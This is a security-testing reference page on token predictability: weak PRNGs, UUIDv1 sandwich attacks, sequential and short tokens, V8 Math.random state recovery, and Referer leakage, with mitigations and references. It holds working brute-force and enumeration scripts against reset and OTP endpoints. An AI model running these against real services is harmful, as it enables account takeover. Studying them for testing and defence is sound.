---
title: Token Predictability / Poor Randomness
---

# Token Predictability / Poor Randomness

Token Predictability occurs when applications generate security-sensitive tokens - session IDs, password reset links, CSRF tokens, API keys — using weak or non-cryptographic pseudo-random number generators (PRNGs). If the output is guessable, reproducible, or derivable from observable inputs (timestamps, IPs, sequential counters), an attacker can forge valid tokens without authentication.

Root cause: using statistical PRNGs (`rand()`, `mt_rand()`, `Math.random()`, `java.util.Random`) where a CSPRNG is required.

## Understanding the Basics

### PRNG vs CSPRNG

| Property | Statistical PRNG | CSPRNG |
| --- | --- | --- |
| Purpose | Simulations, games, stats | Cryptographic / security use |
| Predictable from output | Yes - seed recoverable | No - computationally infeasible |
| Secure for security tokens | No | Yes |
| Recommended for tokens | No | Yes |
| Examples (Weak / Strong) | `mt_rand()`, `rand()`, `Math.random()`, `java.util.Random` | `random_bytes()` (PHP), `secrets` (Python), `crypto.randomBytes()` (Node), `SecureRandom` (Java) |

### Common Weak Seed Sources

Seeds derived from observable or low-entropy inputs make the entire PRNG output predictable:

- Current timestamp (`time()`, `microtime()`, `Date.now()`)
- User IP address or User-Agent
- Sequential counter or auto-increment DB ID
- Process ID (PID)
- Hardcoded / constant seed value
- UUID v1 (timestamp + MAC address — not random)

## Attack Surface

- **Password Reset Links** — Token generated per request; predictable token = account takeover
- **Session Tokens / Session IDs** — Predictable session ID = session hijacking without login
- **CSRF Tokens** — Guessable CSRF token = bypass of cross-site request forgery protection
- **API Keys / Access Tokens** — Weak generation = forge valid API credentials
- **Email Verification Tokens** — Predictable token = verify arbitrary accounts
- **Invite / Magic Links** — Time-seeded token = enumerate valid invite links
- **OTP / PIN Generation** — Insufficient entropy in short numeric codes (4–6 digits)
- **Coupon / Voucher Codes** — Sequential or low-entropy codes = mass redemption

## Exploiting Token Predictability

### 1. Timestamp-Seeded Token Prediction (PHP mt_rand)

PHP's `mt_rand()` has only a **32-bit seed**, and if the app never seeds explicitly it's auto-seeded from system time *and* process ID (PHP ≥ 4.2.0). Because the seed space is just 2³², an attacker who captures a few `mt_rand()` outputs can brute-force the seed offline — `php_mt_seed` searches the full space in under a minute on a modern CPU — and then regenerate every token that process produces. **Knowing the request time is not required.** If the app explicitly calls `mt_srand(time())`, the search collapses to a small time window. (Stronger variant: the Lexfo technique recovers MT state from just 2 outputs with no brute-force at all.)

```bash
# Step 1 — Trigger a password reset for your own account, note the token and exact time
# Step 2 — Use php_mt_seed to recover the seed from a known mt_rand() output

php_mt_seed <observed_token_value>
# Returns candidate seeds

# Step 3 — Replay the PRNG from recovered seed to generate the victim's token
php -r "mt_srand(<recovered_seed>); echo mt_rand();"
```

```python
# Brute force seed space using known approximate timestamp
import subprocess, time

target_time = int(time.time())
for seed in range(target_time - 2, target_time + 2):  # ±2 second window
    output = subprocess.check_output(['php', '-r', f'mt_srand({seed}); echo mt_rand();'])
    print(f"Seed {seed} → {output.decode().strip()}")
# Match output against observed token to confirm seed
```

### 2. UUID v1 Sandwich Attack

UUIDv1 is built from a timestamp + MAC address — not random. An attacker brackets a victim's reset request between two of their own to narrow the token search space to a few thousand values.

```
Attack flow:
1. Trigger password reset for attacker account 1 → receive UUID token A
2. Immediately trigger password reset for victim account
3. Trigger password reset for attacker account 2 → receive UUID token B
4. Victim's token lies between A and B — brute force the timestamp delta
```

```python
import uuid, requests
from datetime import datetime, timedelta

def generate_uuid1_range(uuid_before, uuid_after):
    """Generate all UUIDv1 values between two known UUIDs"""
    t1 = uuid.UUID(uuid_before).time
    t2 = uuid.UUID(uuid_after).time
    node = uuid.UUID(uuid_before).node
    clock_seq = uuid.UUID(uuid_before).clock_seq

    candidates = []
    for t in range(t1, t2):
        candidates.append(str(uuid.UUID(fields=(
            t & 0xFFFFFFFF,
            (t >> 32) & 0xFFFF,
            (t >> 48) & 0x0FFF | 0x1000,
            clock_seq >> 8,
            clock_seq & 0xFF,
            node
        ))))
    return candidates

# Brute force victim's reset token
token_before = "6b894ab2-845d-11ee-8227-00155d4e2cec"
token_after  = "6b89a4c6-845d-11ee-8227-00155d4e2cec"

for token in generate_uuid1_range(token_before, token_after):
    r = requests.get(f"https://target.com/reset?token={token}")
    if "reset" in r.text.lower() and r.status_code == 200:
        print(f"[HIT] {token}")
        break
```

Identify UUID version from a token:

```
xxxxxxxx-xxxx-[M]xxx-xxxx-xxxxxxxxxxxx
                ^ M=1 → UUIDv1 (time-based, vulnerable)
                  M=4 → UUIDv4 (random, safe)
```

### 3. Sequential / Incremental Token Enumeration

Tokens based on counters, auto-increment IDs, or simple patterns are enumerable directly.

```
Observed tokens:
  reset_100042
  reset_100043   ← next in sequence
  inv_20240101_001
  inv_20240101_002   ← date + counter

# Enumerate the next N tokens
for i in $(seq 100044 100200); do
  curl -s "https://target.com/reset?token=reset_$i" | grep -qi "success" \
    && echo "[HIT] reset_$i"
done
```

### 4. Short Token / Low Entropy Brute Force

Tokens with insufficient length or character space are brute-forceable within a practical timeframe.

```python
import requests, itertools, string

# 6-digit numeric OTP — 1,000,000 combinations
for otp in range(0, 1000000):
    r = requests.post('https://target.com/verify',
                      data={'otp': f'{otp:06d}'})
    if r.status_code == 200 and 'verified' in r.text:
        print(f'[HIT] OTP: {otp:06d}')
        break

# 4-char alphanumeric token — 1,679,616 combinations
charset = string.ascii_lowercase + string.digits
for combo in itertools.product(charset, repeat=4):
    token = ''.join(combo)
    r = requests.get(f'https://target.com/confirm?token={token}')
    if 'confirmed' in r.text:
        print(f'[HIT] {token}')
        break
```

Token entropy quick reference:

```
6-digit numeric:          ~20 bits — brute-forceable in seconds
8-char alphanumeric:      ~41 bits — feasible with no rate limiting
16-char alphanumeric:     ~83 bits — acceptable minimum
32-byte CSPRNG (hex):     256 bits — secure
```

### 5. Seed Recovery from Observed Output (JavaScript Math.random)

`Math.random()` in V8 uses xorshift128+ — state is 128 bits but observable outputs can be used to reconstruct internal state. Practical note: V8 refills a pool of 64 values at a time and returns them in **reverse** order, so account for this when correlating observed outputs to solver-recovered state.

```jsx
// Weak token generation — never do this
const token = Math.random().toString(36).substr(2);

// If multiple Math.random() outputs are observable (e.g. exposed in API responses,
// cookies, or error messages), tools like `z3` or pre-built V8 state solvers
// can reconstruct the full PRNG state and predict future outputs.
```

```bash
# Tool: https://github.com/PwnFunction/v8-randomness-predictor
# Feed 5 observed Math.random() outputs into the Python script to recover internal state
# Collect samples first:
#   Array.from(Array(5), Math.random)  ← run in Node/Chrome console
python3 main.py  # edit sequence = [...] in the script with your observed values
# Outputs recovered se_state0 / se_state1 → next Math.random() value predicted
```

### 6. Token Leakage via Referer Header

Password reset tokens embedded in URLs *can* leak to third-party sites via the `Referer` header when the user clicks an external link from the reset page. **Precondition:** since Chrome 85 (Aug 2020) and Firefox 87 (Mar 2021), the default `Referrer-Policy` is `strict-origin-when-cross-origin`, which strips the path and query string on cross-origin requests — so the token no longer leaks by default. This works only when the reset page sets a permissive policy (`unsafe-url`, `no-referrer-when-downgrade`, `origin-when-cross-origin`), leaks to an attacker-controlled resource, or the victim runs an old browser. Keeping tokens out of URLs is still correct regardless.

```
Attack flow:
1. Request password reset → receive link: https://target.com/reset?token=abc123
2. User clicks reset link, lands on reset page
3. Reset page contains external resource (image, script, analytics)
4. Browser sends: Referer: https://target.com/reset?token=abc123 to third-party
5. Attacker-controlled third party or logs capture the token
```

```bash
# Check if reset token is in the URL (vs POST body or hidden field)
# If in URL → test Referer leakage by placing an external link on the page
# Intercept outgoing requests from the reset page in Burp
```

### Test Cases

| Scenario | Action | Expected Outcome |
| --- | --- | --- |
| UUID Version Check | Inspect token format — M field = 1 | UUIDv1 confirmed → sandwich attack applicable |
| Sequential Token | Request 3 resets; compare token values | Incremental pattern = enumeration possible |
| Entropy Analysis | Collect 2,000+ tokens (10k–20k for a thorough result); run Burp Sequencer | Low randomness score = predictable PRNG |
| Short Token Brute Force | 6-digit OTP with no rate limit | 1M attempts feasible; hit within minutes-to-hours depending on request throughput |
| Timestamp Seed | Note reset request time; run php_mt_seed | Seed recovered → victim token generated |
| Referer Leakage | Request reset; visit external link from reset page | Token appears in Referer header (only under a permissive Referrer-Policy) |
| Math.random Token | Observe multiple tokens from same session | V8 state recovery → future tokens predicted |

## Detection Techniques (Offensive Perspective)

### Manual Detection — Identifying Weak Tokens

**Pattern Recognition**

```
Collect 5–10 tokens from the same endpoint and compare:

Reset 1: reset_100042         → sequential counter — vulnerable
Reset 2: reset_100043

Reset 1: 1704067200_a3f2      → timestamp prefix — vulnerable
Reset 2: 1704067205_b1c9

Reset 1: 6b894ab2-845d-11ee   → UUIDv1 (M=1) — vulnerable
Reset 2: 6b89a4c6-845d-11ee   → minimal delta = sandwich attack feasible

Reset 1: f3a9c12e8b4d7f2a...  → high variance, no pattern — likely secure
```

**UUID Version Identification**

```bash
# Extract version nibble from UUID token
echo "6b894ab2-845d-11ee-8227-00155d4e2cec" | cut -d'-' -f3 | cut -c1
# Output: 1 → UUIDv1 (vulnerable)
# Output: 4 → UUIDv4 (safe)
```

**Entropy Check — Token Length & Character Space**

```
Token length < 16 chars             → likely insufficient entropy
Numeric only (e.g., 6-digit OTP)    → max 20 bits — brute-forceable
Base64 / hex, 16+ chars, no pattern → likely CSPRNG
```

### Automated Detection

```bash
# Collect 100 tokens from password reset endpoint
for i in $(seq 1 100); do
  curl -s -X POST https://target.com/forgot-password \
    -d "email=attacker+$i@test.com" \
    -c /dev/null | grep -oP 'token=[^"&\s]+' | cut -d= -f2
done > tokens.txt

# Check for sequential patterns
sort tokens.txt | uniq | awk 'NR>1{if($0-prev==1)print "SEQUENTIAL: "$0}{prev=$0}'

# Feed into Burp Sequencer (live capture or manual load) for statistical analysis
# Significant bits < 64 → weak; < 32 → critical
```

```python
# Measure token entropy
import math, collections

def entropy(token):
    freq = collections.Counter(token)
    length = len(token)
    return -sum((c/length) * math.log2(c/length) for c in freq.values())

tokens = open('tokens.txt').read().splitlines()
for t in tokens:
    e = entropy(t)
    print(f"{t[:20]}... entropy={e:.2f} {'[WEAK]' if e < 3.5 else '[OK]'}")
```

```bash
# Decode UUIDv1 timestamp and node (MAC) — no install required, stdlib only
import uuid, datetime

u = uuid.UUID("6b894ab2-845d-11ee-8227-00155d4e2cec")
print(f"Version  : {u.version}")

# UUID time is 100-ns intervals since 1582-10-15; convert to Unix epoch
unix_ts = (u.time - 0x01b21dd213814000) / 1e7
print(f"Timestamp: {datetime.datetime.utcfromtimestamp(unix_ts)} UTC")
print(f"Node/MAC : {':'.join(f'{(u.node >> i) & 0xff:02x}' for i in (40,32,24,16,8,0))}")
# Version=1 + visible MAC = sandwich attack confirmed feasible
```

## Impact

- **Account Takeover (ATO)** — Predict or brute-force password reset token → reset victim's password without inbox access
- **Session Hijacking** — Predict valid session ID → authenticate as victim without credentials
- **CSRF Protection Bypass** — Guess CSRF token → perform state-changing actions on behalf of authenticated user
- **API Credential Forgery** — Reproduce weak API key generation → forge valid API credentials
- **Mass Account Compromise** — Sequential tokens allow iterating through all user reset tokens systematically
- **Authentication Bypass** — Predict OTP or email verification code → skip verification step entirely

## Tools

| Tool | Purpose |
| --- | --- |
| Burp Sequencer | Statistical entropy analysis of collected token samples |
| Caido Sequencer (community plugin) | Token randomness analysis with scoring and pattern detection |
| php_mt_seed | Recover PHP `mt_rand()` seed from observed output |
| guidtool | Decode UUIDv1 timestamp and MAC address |
| hashcat | Brute-force short or hashed tokens |
| ffuf / Burp Intruder | Enumerate token space against reset / verify endpoints |
| interactsh | Catch Referer-leaked tokens via out-of-band HTTP listener |

## Mitigation & Prevention

1. **Use CSPRNGs** — `random_bytes()` (PHP), `secrets` module (Python), `SecureRandom` (Java), `crypto.randomBytes()` (Node.js) — never `mt_rand()`, `rand()`, or `Math.random()` for security tokens
2. **Minimum Token Entropy** — NIST SP 800-63B sets a floor of **64 bits of entropy** for session secrets; the **128-bit** figure is OWASP's *length* recommendation (≈64 bits effective entropy under hex encoding). For tokens, generate at least **128 bits of raw CSPRNG output** (256 for long-lived tokens) as a conservative margin.
3. **Avoid UUIDv1** — Use UUIDv4 backed by a CSPRNG (verify your library's RNG) or a raw CSPRNG-generated token for all security-sensitive flows
4. **Never Seed from Observable Data** — Timestamps, PIDs, IP addresses, and user IDs are not entropy sources
5. **Token Expiry & Single Use** — Short-lived (15–60 min), single-use tokens limit the brute-force window dramatically
6. **Tokens in POST Body / Headers** — Never embed security tokens in URLs to prevent Referer header leakage
7. **Rate Limit Token Endpoints** — Prevent brute-force of short tokens on reset and OTP verification endpoints

## Good To Read

- https://hackerone.com/reports/1092831
- https://hackerone.com/reports/273560
- https://dev.to/mohamed_aboelkheir/lessons-learned-3-is-your-random-uuid-really-random-account-takeover-with-the-sandwich-attack-4c1n

## References

- [OWASP Web Security Testing Guide — Weak Cryptography (WSTG-CRYP) and Session Management (WSTG-SESS)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/README)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [NIST SP 800-63B: Authenticator & Lifecycle Requirements](https://csrc.nist.gov/pubs/sp/800/63/b/upd2/final)
- [PortSwigger: Analyzing Session Token Randomness with Burp Sequencer](https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/session-management/analyzing-session-token-generation)
- [HackTricks: UUID Insecurities & Sandwich Attack](https://medium.com/@ibm_ptc_security/sandwich-attack-uuid-v1-a114e3a8b6c4)
- [PHP Insufficient Entropy — Survive The Deep End](https://phpsecurity.readthedocs.io/en/latest/Insufficient-Entropy-For-Random-Values.html)
- [Snyk Learn: Insecure Randomness](https://learn.snyk.io/lesson/insecure-randomness/)
- [CWE-330: Use of Insufficiently Random Values](https://cwe.mitre.org/data/definitions/330.html)
- [AppSec Labs: Sandwich Attacks — From Reset Password to Account Takeover](https://appsec-labs.com/sandwich-attacks/)